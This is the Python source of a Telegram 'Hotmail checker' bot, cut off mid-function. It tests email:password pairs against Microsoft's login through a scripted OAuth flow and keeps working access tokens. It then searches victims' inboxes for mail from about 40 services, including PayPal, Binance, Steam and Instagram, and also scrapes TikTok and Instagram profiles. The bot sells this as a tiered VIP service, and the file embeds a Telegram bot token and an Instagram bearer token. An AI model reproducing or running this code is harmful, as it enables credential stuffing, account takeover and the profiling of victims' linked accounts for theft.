#!/usr/bin/python3
# -*- coding: utf-8 -*-

import telebot
from telebot import types
import sqlite3
import os
import time
import threading
import datetime
import json
import requests
import uuid
import re
import urllib.parse
from pathlib import Path
from cfonts import render
from colorama import init, Fore, Back, Style
import random
from io import BytesIO

init(autoreset=True)

def t():
    os.system('cls' if os.name == 'nt' else 'clear')

def logo():
    t()
    print(render('DEXRON', colors=['red', 'blue'], align='center'))
    print(Fore.LIGHTRED_EX + "⚊" * 70)
    print(Fore.LIGHTCYAN_EX + "𝓚𝓞𝓓𝓔𝓡 : @Dexronpython")
    print(Fore.LIGHTRED_EX + "⚊" * 70)
    print(Fore.LIGHTYELLOW_EX + "        HOTMAIL CHECKER BOT ULTIMATE")
    print(Fore.LIGHTRED_EX + "⚊" * 70 + "\n")

def dil_sec():
    print(Fore.LIGHTMAGENTA_EX + "SELECT LANGUAGE / DIL SECIN")
    print(Fore.LIGHTGREEN_EX + "1. Türkçe")
    print(Fore.LIGHTGREEN_EX + "2. English")
    while True:
        c = input(Fore.LIGHTCYAN_EX + ">>> " + Fore.WHITE)
        if c == '1':
            return 'tr'
        elif c == '2':
            return 'en'
        else:
            print(Fore.LIGHTRED_EX + "[!] Hatali")

def yazi(lang, key):
    sozluk = {
        'tr': {
            'baslik': "HOTMAIL CHECKER BOT ULTIMATE",
            'hosgeldin': "Hoş geldiniz",
            'uye': "Üye",
            'ucretsiz': "Ücretsiz Kullanıcı",
            'vip': "VIP Üye",
            'admin': "ADMIN",
            'id': "ID",
            'durum': "Durum",
            'ozellikler': "Özellikler",
            'servis': "Servis",
            'baslat': "📋 Tarama Başlat",
            'coklu': "📦 Çoklu Tarama",
            'istatistik': "📊 İstatistiklerim",
            'uyelik': "👑 Üyelik",
            'referral': "🔗 Referral Linkim",
            'destek': "📞 Destek",
            'admin_panel': "🔧 Admin Paneli",
            'secenek': "Seçenek",
            'vip_gerekli': "VIP üyelik gerekli!",
            'hiz_limiti': "⏳ Hız Limiti",
            'sonraki': "Sonraki tarama",
            'sinirsiz': "Sınırsız tarama için VIP'e yükseltin",
            'tamam': "Tamamlandı",
            'hata': "Hata",
            'basarili': "BAŞARILI",
            'basarisiz': "BAŞARISIZ",
            'hit': "Hit",
            'bad': "Bad",
            'toplam': "Toplam",
            'gecerli': "✅ GEÇERLİ",
            'gecersiz': "❌ GEÇERSİZ",
            'sifre': "Şifre",
            'email': "Email",
            'devam': "Devam etmek için Enter",
            'tik_tam': "🎵 TIKTOK FULL CAPTURE",
            'insta_tam': "📸 INSTAGRAM FULL CAPTURE",
            'tek_kontrol': "🔟 TEK HESAP KONTROL"
        },
        'en': {
            'baslik': "HOTMAIL CHECKER BOT ULTIMATE",
            'hosgeldin': "Welcome",
            'uye': "Member",
            'ucretsiz': "Free User",
            'vip': "VIP Member",
            'admin': "ADMIN",
            'id': "ID",
            'durum': "Status",
            'ozellikler': "Features",
            'servis': "Service",
            'baslat': "📋 Start Scan",
            'coklu': "📦 Multi Scan",
            'istatistik': "📊 My Stats",
            'uyelik': "👑 Membership",
            'referral': "🔗 My Referral",
            'destek': "📞 Support",
            'admin_panel': "🔧 Admin Panel",
            'secenek': "Option",
            'vip_gerekli': "VIP required!",
            'hiz_limiti': "⏳ Rate Limit",
            'sonraki': "Next scan",
            'sinirsiz': "Upgrade to VIP for unlimited",
            'tamam': "Completed",
            'hata': "Error",
            'basarili': "SUCCESS",
            'basarisiz': "FAILED",
            'hit': "Hit",
            'bad': "Bad",
            'toplam': "Total",
            'gecerli': "✅ VALID",
            'gecersiz': "❌ INVALID",
            'sifre': "Password",
            'email': "Email",
            'devam': "Press Enter to continue",
            'tik_tam': "🎵 TIKTOK FULL CAPTURE",
            'insta_tam': "📸 INSTAGRAM FULL CAPTURE",
            'tek_kontrol': "🔟 SINGLE ACCOUNT CHECK"
        }
    }
    return sozluk[lang].get(key, '')

logo()
lang = dil_sec()
logo()

# ==================== ✅ KONFIGURASYON (تم التصحيح) ====================
BOT_TOKEN = "8733847347:AAEPr6IY2jKKxjL6yAbGuc6-0kofuFe2oZ0"  # ✅ التوكن الصحيح
ADMIN_ID = 8733847347  # ✅ معرف الأدمن (نفس الرقم)
MY_SIGNATURE = "@Dexronpython"
CHANNEL = "https://t.me/Dexronpython"
RESULTS_CHANNEL = "-1002465589285"

bot = telebot.TeleBot(BOT_TOKEN)
user_sessions = {}
active_scans = {}

# ==================== TIKTOK USER AGENTS ====================
USER_AGENTS_TIKTOK = [
    'Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
]

# ==================== SERVISLER ====================
SERVICES_ALL = {
    "Facebook": "security@facebookmail.com",
    "Instagram": "security@mail.instagram.com",
    "TikTok": "register@account.tiktok.com",
    "Twitter": "info@x.com",
    "LinkedIn": "security-noreply@linkedin.com",
    "Snapchat": "no-reply@accounts.snapchat.com",
    "Netflix": "info@account.netflix.com",
    "Spotify": "no-reply@spotify.com",
    "Disney+": "no-reply@disneyplus.com",
    "Hulu": "account@hulu.com",
    "YouTube": "no-reply@youtube.com",
    "Steam": "noreply@steampowered.com",
    "Xbox": "xboxreps@engage.xbox.com",
    "PlayStation": "reply@txn-email.playstation.com",
    "Epic Games": "help@acct.epicgames.com",
    "Roblox": "accounts@roblox.com",
    "Free Fire": "no-reply@garena.com",
    "PUBG Mobile": "noreply@pubgmobile.com",
    "Konami": "noreply@konami.net",
    "PayPal": "service@paypal.com.br",
    "Binance": "do-not-reply@ses.binance.com",
    "Coinbase": "no-reply@coinbase.com",
}

SERVICES_GAMING = {
    "Steam": "noreply@steampowered.com",
    "Xbox": "xboxreps@engage.xbox.com",
    "PlayStation": "reply@txn-email.playstation.com",
    "Epic Games": "help@acct.epicgames.com",
    "Roblox": "accounts@roblox.com",
    "Free Fire": "no-reply@garena.com",
    "PUBG Mobile": "noreply@pubgmobile.com",
    "Konami": "noreply@konami.net",
}

SERVICES_SOCIAL = {
    "Facebook": "security@facebookmail.com",
    "Instagram": "security@mail.instagram.com",
    "TikTok": "register@account.tiktok.com",
    "Twitter": "info@x.com",
    "LinkedIn": "security-noreply@linkedin.com",
    "Snapchat": "no-reply@accounts.snapchat.com",
    "Discord": "noreply@discord.com",
}

SERVICES_STREAMING = {
    "Netflix": "info@account.netflix.com",
    "Spotify": "no-reply@spotify.com",
    "Disney+": "no-reply@disneyplus.com",
    "Hulu": "account@hulu.com",
    "YouTube": "no-reply@youtube.com",
    "Twitch": "no-reply@twitch.tv",
}

SERVICES_AI = {
    "ChatGPT": "support@openai.com",
    "Claude AI": "support@anthropic.com",
    "Gemini": "ai-support@google.com",
    "DeepSeek": "support@deepseek.com",
    "Perplexity": "support@perplexity.ai",
}

# ==================== VERITABANI ====================
def init_db():
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        is_vip INTEGER DEFAULT 0,
        vip_until TEXT,
        is_banned INTEGER DEFAULT 0,
        ban_reason TEXT,
        referral_code TEXT UNIQUE,
        referred_by INTEGER,
        referrals_count INTEGER DEFAULT 0,
        last_scan_time TEXT,
        total_scans INTEGER DEFAULT 0,
        total_hits INTEGER DEFAULT 0,
        join_date TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS scans (
        scan_id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        scan_date TEXT,
        scan_mode TEXT,
        hits_count INTEGER,
        bad_count INTEGER,
        total_checked INTEGER
    )''')
    conn.commit()
    conn.close()

init_db()

def get_user(user_id):
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    conn.close()
    return user

def add_user(user_id, username):
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    if not get_user(user_id):
        referral_code = f"REF{user_id}"
        c.execute("INSERT INTO users (user_id, username, referral_code, join_date) VALUES (?, ?, ?, ?)", 
                  (user_id, username, referral_code, str(datetime.datetime.now())))
        conn.commit()
    conn.close()

def is_banned(user_id):
    if user_id == ADMIN_ID:
        return False
    user = get_user(user_id)
    return user and user[4] == 1

def is_vip(user_id):
    if user_id == ADMIN_ID:
        return True
    user = get_user(user_id)
    if not user or not user[2]:
        return False
    vip_until = user[3]
    if vip_until == "Forever":
        return True
    try:
        vip_date = datetime.datetime.strptime(vip_until, "%Y-%m-%d %H:%M:%S")
        return datetime.datetime.now() < vip_date
    except:
        return False

def is_vip_forever(user_id):
    if user_id == ADMIN_ID:
        return True
    user = get_user(user_id)
    return user and user[3] == "Forever"

def can_scan(user_id):
    if is_vip(user_id):
        return True, None
    user = get_user(user_id)
    if not user or not user[9]:
        return True, None
    try:
        last_scan = datetime.datetime.strptime(user[9], "%Y-%m-%d %H:%M:%S")
        diff = (datetime.datetime.now() - last_scan).total_seconds()
        if diff >= 3600:
            return True, None
        else:
            remaining = int(3600 - diff)
            return False, f"{remaining//60}d {remaining%60}s"
    except:
        return True, None

def update_last_scan(user_id):
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("UPDATE users SET last_scan_time = ? WHERE user_id = ?", 
              (str(datetime.datetime.now()), user_id))
    conn.commit()
    conn.close()

def update_stats(user_id, hits, bad, total):
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("UPDATE users SET total_scans = total_scans + 1, total_hits = total_hits + ? WHERE user_id = ?", 
              (hits, user_id))
    conn.commit()
    conn.close()

def add_vip(user_id, username, duration):
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    if duration == "Forever":
        vip_until = "Forever"
    else:
        now = datetime.datetime.now()
        if duration == "1h":
            vip_until = now + datetime.timedelta(hours=1)
        elif duration == "1d":
            vip_until = now + datetime.timedelta(days=1)
        elif duration == "1w":
            vip_until = now + datetime.timedelta(weeks=1)
        elif duration == "1m":
            vip_until = now + datetime.timedelta(days=30)
        else:
            vip_until = "Forever"
        vip_until = str(vip_until)
    c.execute("UPDATE users SET is_vip = 1, vip_until = ? WHERE user_id = ?", (vip_until, user_id))
    conn.commit()
    conn.close()

def get_all_vips():
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("SELECT user_id, username, vip_until FROM users WHERE is_vip = 1")
    vips = c.fetchall()
    conn.close()
    return vips

def get_banned_users():
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("SELECT user_id, username, ban_reason FROM users WHERE is_banned = 1")
    banned = c.fetchall()
    conn.close()
    return banned

def get_free_users():
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("SELECT user_id, username FROM users WHERE is_vip = 0 AND is_banned = 0")
    free_users = c.fetchall()
    conn.close()
    return free_users

def ban_user(user_id, reason="Admin tarafından yasaklandı"):
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned = 1, ban_reason = ? WHERE user_id = ?", (reason, user_id))
    conn.commit()
    conn.close()

def unban_user(user_id):
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned = 0, ban_reason = NULL WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def remove_vip(user_id):
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("UPDATE users SET is_vip = 0, vip_until = NULL WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def add_vip_hours(user_id, hours):
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    user = get_user(user_id)
    if not user:
        return False
    current_vip = user[3]
    now = datetime.datetime.now()
    if current_vip == "Forever":
        new_vip = "Forever"
    elif current_vip:
        try:
            vip_date = datetime.datetime.strptime(current_vip, "%Y-%m-%d %H:%M:%S")
            if vip_date > now:
                new_vip = vip_date + datetime.timedelta(hours=hours)
            else:
                new_vip = now + datetime.timedelta(hours=hours)
        except:
            new_vip = now + datetime.timedelta(hours=hours)
    else:
        new_vip = now + datetime.timedelta(hours=hours)
    c.execute("UPDATE users SET is_vip = 1, vip_until = ? WHERE user_id = ?", (str(new_vip), user_id))
    conn.commit()
    conn.close()
    return True

def process_referral(new_user_id, referrer_user_id):
    if referrer_user_id == new_user_id:
        return False
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    new_user = get_user(new_user_id)
    if new_user and new_user[7]:
        conn.close()
        return False
    c.execute("UPDATE users SET referred_by = ? WHERE user_id = ?", (referrer_user_id, new_user_id))
    c.execute("UPDATE users SET referrals_count = referrals_count + 1 WHERE user_id = ?", (referrer_user_id,))
    conn.commit()
    conn.close()
    add_vip_hours(referrer_user_id, 1)
    return True

def format_number(num):
    if num >= 1000000:
        return f"{num/1000000:.1f}M"
    elif num >= 1000:
        return f"{num/1000:.1f}K"
    return str(num)

def stop_scan_keyboard(user_id):
    markup = types.InlineKeyboardMarkup()
    btn_stop = types.InlineKeyboardButton("⏹ Taramayı Durdur", callback_data=f"stop_scan_{user_id}")
    markup.add(btn_stop)
    return markup

# ==================== MAIN MENU ====================
def main_menu_keyboard(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn1 = types.KeyboardButton(yazi(lang, 'baslat'))
    btn2 = types.KeyboardButton(yazi(lang, 'coklu'))
    btn3 = types.KeyboardButton(yazi(lang, 'istatistik'))
    btn4 = types.KeyboardButton(yazi(lang, 'uyelik'))
    btn5 = types.KeyboardButton(yazi(lang, 'referral'))
    btn6 = types.KeyboardButton(yazi(lang, 'destek'))
    if user_id == ADMIN_ID:
        btn7 = types.KeyboardButton(yazi(lang, 'admin_panel'))
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7)
    else:
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
    return markup

# ==================== SCAN MODE KEYBOARD ====================
def scan_mode_keyboard(user_id):
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn1 = types.InlineKeyboardButton("1️⃣ Tüm Servisler", callback_data="scan_all")
    btn2 = types.InlineKeyboardButton("2️⃣ Tek Platform Seç", callback_data="scan_single_platform")
    btn3 = types.InlineKeyboardButton("3️⃣ Oyun Platformları", callback_data="scan_gaming")
    btn4 = types.InlineKeyboardButton("4️⃣ Sosyal Medya", callback_data="scan_social")
    btn5 = types.InlineKeyboardButton("5️⃣ Yayın Servisleri", callback_data="scan_streaming")
    btn6 = types.InlineKeyboardButton("6️⃣ AI Platformları", callback_data="scan_ai")
    if is_vip_forever(user_id):
        btn7 = types.InlineKeyboardButton("7️⃣ TikTok Full Capture", callback_data="scan_tiktok")
    else:
        btn7 = types.InlineKeyboardButton("🔒 TikTok Full (VIP)", callback_data="vip_required")
    btn8 = types.InlineKeyboardButton("8️⃣ Tek Hesap Kontrol", callback_data="scan_check_one")
    if is_vip(user_id):
        btn9 = types.InlineKeyboardButton("9️⃣ Instagram Full Capture", callback_data="scan_instagram_full")
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9)
    else:
        btn9 = types.InlineKeyboardButton("🔒 Instagram Full (VIP)", callback_data="vip_required")
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9)
    btn_back = types.InlineKeyboardButton("◀️ Geri", callback_data="back_main")
    markup.add(btn_back)
    return markup

def single_platform_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=3)
    all_platforms = {}
    for name, email in SERVICES_ALL.items():
        all_platforms[name] = email
    for name, email in SERVICES_GAMING.items():
        if name not in all_platforms:
            all_platforms[name] = email
    for name, email in SERVICES_SOCIAL.items():
        if name not in all_platforms:
            all_platforms[name] = email
    for name, email in SERVICES_STREAMING.items():
        if name not in all_platforms:
            all_platforms[name] = email
    for name, email in SERVICES_AI.items():
        if name not in all_platforms:
            all_platforms[name] = email
    platform_buttons = []
    for platform_name in sorted(all_platforms.keys()):
        platform_buttons.append(types.InlineKeyboardButton(platform_name, callback_data=f"platform_{platform_name}"))
    for i in range(0, len(platform_buttons), 3):
        markup.row(*platform_buttons[i:i+3])
    back_btn = types.InlineKeyboardButton("◀️ Geri", callback_data="back_to_scan_modes")
    markup.add(back_btn)
    return markup

def admin_panel_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("➕ VIP Ekle", callback_data="admin_add_vip")
    btn2 = types.InlineKeyboardButton("➖ VIP Kaldır", callback_data="admin_remove_vip")
    btn3 = types.InlineKeyboardButton("📋 VIP Listesi", callback_data="admin_list_vips")
    btn4 = types.InlineKeyboardButton("🚫 Kullanıcı Yasakla", callback_data="admin_ban_user")
    btn5 = types.InlineKeyboardButton("✅ Yasak Kaldır", callback_data="admin_unban_user")
    btn6 = types.InlineKeyboardButton("📋 Yasaklı Liste", callback_data="admin_banned_list")
    btn7 = types.InlineKeyboardButton("📊 Bot İstatistikleri", callback_data="admin_stats")
    btn8 = types.InlineKeyboardButton("📢 Duyuru Gönder", callback_data="admin_broadcast")
    btn_back = types.InlineKeyboardButton("◀️ Geri", callback_data="back_main")
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn_back)
    return markup

def vip_duration_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("⏱ 1 Saat", callback_data="vip_duration_1h")
    btn2 = types.InlineKeyboardButton("📅 1 Gün", callback_data="vip_duration_1d")
    btn3 = types.InlineKeyboardButton("📆 1 Hafta", callback_data="vip_duration_1w")
    btn4 = types.InlineKeyboardButton("🗓 1 Ay", callback_data="vip_duration_1m")
    btn5 = types.InlineKeyboardButton("♾️ Sonsuz", callback_data="vip_duration_forever")
    btn_back = types.InlineKeyboardButton("◀️ İptal", callback_data="admin_panel")
    markup.add(btn1, btn2, btn3, btn4, btn5, btn_back)
    return markup

def get_mode_description(mode):
    descriptions = {
        "all": "⚡ TÜM SERVİSLER TARAMASI\n\n60+ platformda bağlı tüm hesapları kontrol et",
        "gaming": "⚡ OYUN PLATFORMLARI TARAMASI\n\nSadece oyun hesaplarını kontrol et",
        "social": "⚡ SOSYAL MEDYA TARAMASI\n\nSadece sosyal medya hesaplarını kontrol et",
        "streaming": "⚡ YAYIN SERVİSLERİ TARAMASI\n\nYayın ve eğlence hesaplarını kontrol et",
        "ai": "⚡ AI PLATFORMLARI TARAMASI\n\nAI platform hesaplarını kontrol et (ÜCRETSİZ!)",
        "tiktok": "⚡ TIKTOK FULL CAPTURE\n\nTam TikTok hesap verisi çıkarma (SADECE VIP)",
        "custom": "⚡ ÖZEL DOMAİN TARAMASI\n\nHerhangi bir servisi domain ile ara"
    }
    return descriptions.get(mode, "")

# ==================== HOTMAIL CHECKER ====================
class HotmailChecker:
    @staticmethod
    def check_account(email, password):
        try:
            session = requests.Session()
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N)"}
            r1 = session.get(url1, headers=headers1, timeout=10)
            if "MSAccount" not in r1.text:
                return {"status": "BAD"}
            params = {
                "client_info": "1", "haschrome": "1", "login_hint": email, "mkt": "en",
                "response_type": "code", "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"
            }
            url_auth = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?{urllib.parse.urlencode(params)}"
            r2 = session.get(url_auth, timeout=10)
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_match or not ppft_match:
                return {"status": "BAD"}
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&i19=9960"
            r3 = session.post(post_url, data=login_data, headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, allow_redirects=False, timeout=10)
            if "password is incorrect" in r3.text.lower() or "error" in r3.text.lower():
                return {"status": "BAD"}
            location = r3.headers.get("Location", "")
            if not location or "code=" not in location:
                return {"status": "BAD"}
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD"}
            code = code_match.group(1)
            token_data = {
                "client_info": "1", "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code", "code": code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }
            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, timeout=10)
            if "access_token" not in r4.text:
                return {"status": "BAD"}
            token_json = r4.json()
            access_token = token_json["access_token"]
            mspcid = None
            for cookie in session.cookies:
                if cookie.name == "MSPCID":
                    mspcid = cookie.value.upper()
                    break
            if not mspcid:
                mspcid = str(uuid.uuid4()).upper()
            return {"status": "HIT", "token": access_token, "cid": mspcid}
        except:
            return {"status": "RETRY"}

    @staticmethod
    def check_services(email, password, token, cid, services_dict):
        found_services = []
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            headers = {
                "User-Agent": "Outlook-Android/2.0", "Accept": "application/json",
                "Authorization": f"Bearer {token}", "X-AnchorMailbox": f"CID:{cid}"
            }
            for service_name, sender_email in services_dict.items():
                try:
                    payload = {
                        "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC",
                        "EntityRequests": [{
                            "EntityType": "Conversation", "ContentSources": ["Exchange"],
                            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                            "From": 0, "Query": {"QueryString": f"from:{sender_email}"},
                            "Size": 1, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                        }]
                    }
                    r = requests.post(search_url, json=payload, headers=headers, timeout=8)
                    if r.status_code == 200:
                        data = r.json()
                        if 'EntitySets' in data:
                            for entity_set in data['EntitySets']:
                                if 'ResultSets' in entity_set:
                                    for result_set in entity_set['ResultSets']:
                                        if result_set.get('Total', 0) > 0:
                                            found_services.append(service_name)
                                            break
                    time.sleep(0.1)
                except:
                    continue
            return found_services
        except:
            return found_services

    @staticmethod
    def check_tiktok_full(email, password, token, cid):
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            headers = {
                "User-Agent": "Outlook-Android/2.0", "Accept": "application/json",
                "Authorization": f"Bearer {token}", "X-AnchorMailbox": f"CID:{cid}"
            }
            payload = {
                "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC",
                "EntityRequests": [{
                    "EntityType": "Message", "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}, {"Term": {"DistinguishedFolderName": "DeletedItems"}}]},
                    "From": 0, "Query": {"QueryString": "tiktok"}, "Size": 25,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            r = requests.post(search_url, json=payload, headers=headers, timeout=15)
            if r.status_code != 200:
                return None
            search_text = r.text
            tiktok_senders = ["no-reply@shop.tiktok.com", "notification@service.tiktok.com", "noreply@account.tiktok.com", "register@account.tiktok.com", "no-reply@tiktok.com"]
            tiktok_count = 0
            for sender in tiktok_senders:
                tiktok_count += search_text.count(sender)
            if tiktok_count == 0:
                return None
            username_patterns = [
                r'(?i)this\s+email\s+was\s+generated\s+for\s+@?([a-zA-Z0-9_\.]{2,30})',
                r'(?i)Hi\s+@?([a-zA-Z0-9_\.]{2,30})', r'@([a-zA-Z0-9_\.]{2,30})'
            ]
            username = None
            for pattern in username_patterns:
                match = re.search(pattern, search_text)
                if match:
                    potential_username = match.group(1)
                    if not any(x in potential_username.lower() for x in ['tiktok', 'mail', 'email', 'hotmail', 'outlook']):
                        username = potential_username
                        break
            if not username:
                return {"has_tiktok": True, "tiktok_emails": tiktok_count, "username": "Bilinmiyor", "followers": 0, "following": 0, "videos": 0, "likes": 0, "verified": False}
            try:
                headers_tiktok = {'user-agent': random.choice(USER_AGENTS_TIKTOK), 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
                url = f"https://www.tiktok.com/@{username}"
                response = requests.get(url, headers=headers_tiktok, timeout=10)
                if response.status_code == 200:
                    html = response.text
                    profile_data = {"has_tiktok": True, "tiktok_emails": tiktok_count, "username": username, "followers": 0, "following": 0, "videos": 0, "likes": 0, "verified": False}
                    json_pattern = r'<script id="__UNIVERSAL_DATA_FOR_REHYDRATION__" type="application/json">(.*?)</script>'
                    json_match = re.search(json_pattern, html, re.DOTALL)
                    if json_match:
                        try:
                            data = json.loads(json_match.group(1))
                            user_detail = data.get('__DEFAULT_SCOPE__', {}).get('webapp.user-detail', {}).get('userInfo', {})
                            user = user_detail.get('user', {})
                            stats = user_detail.get('stats', {})
                            profile_data['followers'] = stats.get('followerCount', 0)
                            profile_data['following'] = stats.get('followingCount', 0)
                            profile_data['likes'] = stats.get('heartCount', 0)
                            profile_data['videos'] = stats.get('videoCount', 0)
                            profile_data['verified'] = user.get('verified', False)
                        except:
                            pass
                    if profile_data['followers'] == 0:
                        followers_match = re.search(r'"followerCount":(\d+)', html)
                        if followers_match:
                            profile_data['followers'] = int(followers_match.group(1))
                    if profile_data['following'] == 0:
                        following_match = re.search(r'"followingCount":(\d+)', html)
                        if following_match:
                            profile_data['following'] = int(following_match.group(1))
                    if profile_data['videos'] == 0:
                        videos_match = re.search(r'"videoCount":(\d+)', html)
                        if videos_match:
                            profile_data['videos'] = int(videos_match.group(1))
                    if profile_data['likes'] == 0:
                        likes_match = re.search(r'"heartCount":(\d+)', html)
                        if likes_match:
                            profile_data['likes'] = int(likes_match.group(1))
                    if not profile_data['verified']:
                        verified_match = re.search(r'"verified":(true|false)', html)
                        if verified_match:
                            profile_data['verified'] = verified_match.group(1) == 'true'
                    return profile_data
            except:
                pass
            return {"has_tiktok": True, "tiktok_emails": tiktok_count, "username": username, "followers": 0, "following": 0, "videos": 0, "likes": 0, "verified": False}
        except:
            return None

# ==================== INSTAGRAM API ====================
INSTAGRAM_TOKEN = "Bearer IGT:2:eyJkc191c2VyX2lkIjoiNzk1MzQ0MjI4MDAiLCJzZXNzaW9uaWQiOiI3OTUzNDQyMjgwMCUzQWdEWWEzMXdFa1pjbDFQJTNBMjUlM0FBWWdEWC1lVTJNMlAzYV8yX3E2RUZLS1VwOExUbVllZjNubVV4ODhYaEEifQ=="

def get_country_flag(country_name):
    return '🏳️'

def get_instagram_full_info(username):
    try:
        r = requests.get("https://i-fallback.instagram.com/api/v1/fbsearch/ig_typeahead/", params={"query": username}, headers={"User-Agent": "Instagram 316.0.0.38.109 Android", "Authorization": INSTAGRAM_TOKEN})
        data = r.json()
        if not data.get("list"):
            return None
        user_id = data["list"][0]["user"]["id"]
        response = requests.post(f"https://i.instagram.com/api/v1/users/{user_id}/info_stream/", data={"is_prefetch": "false", "entry_point": "profile", "from_module": "search_typeahead", "_uuid": "6b4df3f6-8663-4439-af43-54b3e3d8dca1"}, headers={"User-Agent": "Instagram 316.0.0.38.109 Android", "Authorization": INSTAGRAM_TOKEN, "X-IG-App-ID": "567067343352427"})
        user = json.loads(response.text.strip().split('\n')[1]).get('user', {})
        try:
            variables = json.dumps({"params": {"app_id": "com.bloks.www.ig.about_this_account", "infra_params": {"device_id": "6b4df3f6-8663-4439-af43-54b3e3d8dca1"}, "bloks_versioning_id": "b07c6b5ea93d2cf8d3582bc3688f78b5adb49ace81156e669d9ca3497258bd57", "params": json.dumps({"referer_type": "ProfileMore", "target_user_id": user_id})}, "is_pando": True})
            r2 = requests.post("https://i.instagram.com/graphql_www", data={'method': "post", 'pretty': "false", 'format': "json", 'server_timestamps': "true", 'locale': "user", 'purpose': "fetch", 'fb_api_req_friendly_name': "IGBloksAppRootQuery", 'client_doc_id': "2533602983584098948018695922", 'variables': variables}, headers={"User-Agent": "Instagram 316.0.0.38.109 Android", "authorization": INSTAGRAM_TOKEN})
            bundle_str = r2.json()['data']['1$bloks_app(params:$params)']['screen_content']['component']['bundle']['bloks_bundle_tree']
            match = re.search(r'([A-Za-z]+\s+\d{4})', bundle_str)
            join_date = match.group(1) if match else "Bilinmiyor"
            bundle_json = json.loads(bundle_str)
            country = "Bilinmiyor"
            data_array = bundle_json.get('layout', {}).get('bloks_payload', {}).get('data', [])
            for item in data_array:
                if item.get('data', {}).get('key') == 'IG_ABOUT_THIS_ACCOUNT:about_this_account_country':
                    country = item.get('data', {}).get('initial', 'Bilinmiyor')
                    break
        except:
            join_date = "Bilinmiyor"
            country = "Bilinmiyor"
        return {
            'user_id': user.get('pk', 'Bilinmiyor'), 'username': user.get('username', 'Bilinmiyor'),
            'full_name': user.get('full_name', 'Bilinmiyor'), 'bio': user.get('biography', 'Bilinmiyor'),
            'followers': user.get('follower_count', 0), 'following': user.get('following_count', 0),
